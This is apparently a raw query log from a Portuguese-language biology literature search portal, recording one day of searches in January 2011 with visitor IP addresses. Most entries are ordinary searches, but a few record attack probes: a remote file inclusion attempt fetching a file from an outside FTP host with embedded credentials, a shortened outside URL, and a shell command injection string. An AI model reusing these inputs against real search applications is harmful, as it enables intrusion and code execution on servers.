date;ip;lang;col;site;query;index;where;filter;from
2011-01-28 00:08:15;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 00:19:03;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 00:40:22;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2011-01-28 00:58:47;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 02:19:05;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2011-01-28 03:35:13;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 04:51:23;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2011-01-28 05:41:05;189.71.105.77;pt;local;ftp://claudiobirra.com:4m3r1c4n@claudiobirra.com/f.txt?;*;*;*;;1
2011-01-28 08:00:15;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 08:04:14;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 08:07:53;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 08:20:14;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 08:36:47;78.110.50.119;pt;local;bio;*;http://www.ourl.in/Ckrid1???;*;;1
2011-01-28 08:36:50;78.110.50.119;pt;local;bio;*;|echo \"casper\";echo \"kae\";|;*;;1
2011-01-28 08:43:01;66.249.71.52;qwkilqgvraugpkn;local;bio;*;*;*;;1
2011-01-28 08:56:34;66.249.71.52;pt;local;bio;+id:("scl-S0074-02761909000200006");*;*;;1
2011-01-28 10:02:00;66.249.71.52;pt;local;bio;*;*;*;;1
2011-01-28 10:44:27;200.136.111.130;pt;local;bio;g s rodrigues;*;*;;1
2011-01-28 10:44:46;200.136.111.130;pt;local;bio;stachetti rodrigues;*;*;;1
2011-01-28 11:46:27;66.249.71.52;pt;local;bio;*;*;*;;1
2011-01-28 12:46:37;161.148.171.2;pt;local;bio;*;*;SCIB;db:SCIB;1
2011-01-28 12:59:53;200.139.12.121;pt;local;bio;acervos de coleções biológicos;*;*;;1
2011-01-28 13:00:18;161.148.171.2;pt;local;bio;*;*;BHLB;db:BHLB;1
2011-01-28 13:00:20;161.148.171.2;pt;local;bio;*;*;SCIB;db:SCIB;1
2011-01-28 13:00:35;200.139.12.121;pt;local;bio;coleções biológicos;*;ALL;;1
2011-01-28 13:00:53;200.139.12.121;pt;local;bio;coleções;*;ALL;;1
2011-01-28 13:01:22;200.139.12.121;pt;local;bio;acervo;*;ALL;;1
2011-01-28 13:01:57;66.249.71.52;pt;local;bio;Sua seleção;*;*;;1
2011-01-28 13:02:52;200.139.12.121;pt;local;bio;acervo;*;ALL;ta_cluster:"Rev. Bras. Zool.";1
2011-01-28 13:03:29;187.78.145.31;pt;local;bio;beleza e o mármore;*;*;;1
2011-01-28 13:17:30;187.112.227.170;pt;local;bio;*;*;SCIB;db:SCIB;1
2011-01-28 13:39:42;161.148.171.2;pt;local;bio;limnologia;*;*;;1
2011-01-28 14:16:11;189.86.42.22;pt;local;bio;*;*;BHLB;db:BHLB;1
2011-01-28 14:16:22;189.86.42.22;pt;local;bio;*;*;BHLB;db:BHLB;2
2011-01-28 14:16:26;189.86.42.22;pt;local;bio;*;*;BHLB;db:BHLB;4
2011-01-28 14:17:00;189.86.42.22;pt;local;bio;zoológico;ti;BHLB;db:BHLB;1
2011-01-28 14:17:08;189.86.42.22;pt;local;bio;fauna;ti;BHLB;db:BHLB;1
2011-01-28 14:17:23;189.86.42.22;pt;local;bio;fauna;ti;BHLB;db:BHLB AND ta_cluster:"Fauna brasiliense.";1
2011-01-28 14:30:49;161.148.171.2;pt;local;bio;*;*;SCIB;db:SCIB;1
2011-01-28 14:31:00;161.148.171.2;pt;local;bio;Pteridium aquilinun;*;*;;1
2011-01-28 14:31:02;161.148.171.2;pt;local;bio;Pteridium aquilinun;*;*;;1
2011-01-28 14:31:19;161.148.171.2;pt;local;bio;Pteridium aquilinun;kw;ALL;;1
2011-01-28 14:39:52;200.252.135.219;pt;local;bio;*;*;BHLB;db:BHLB;1
2011-01-28 14:40:10;200.252.135.219;pt;local;bio;saturniidae;*;BHLB;db:BHLB;1
2011-01-28 14:40:19;200.252.135.219;pt;local;bio;sphingidae;*;BHLB;db:BHLB;1
2011-01-28 14:40:29;200.252.135.219;pt;local;bio;entomofauna;*;BHLB;db:BHLB;1
